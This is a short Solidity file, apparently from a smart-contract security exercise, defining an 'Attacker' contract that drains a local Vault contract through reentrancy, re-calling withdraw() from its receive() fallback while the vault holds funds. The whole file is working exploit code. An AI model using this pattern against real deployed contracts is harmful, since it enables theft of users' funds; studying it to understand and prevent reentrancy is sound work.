// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;
import "../src/Vault.sol";

contract Attacker {
    Vault public vault;
    uint private count;

    constructor(address payable _vault) {
        vault = Vault(_vault);
    }

    receive() external payable {
        //重入攻击：如果合约还有余额，就继续提取
        if (address(vault).balance > 0 && count < 10) {
            count++;
            vault.withdraw();
        }
    }

    function attack() public {
        vault.withdraw();
    }
}
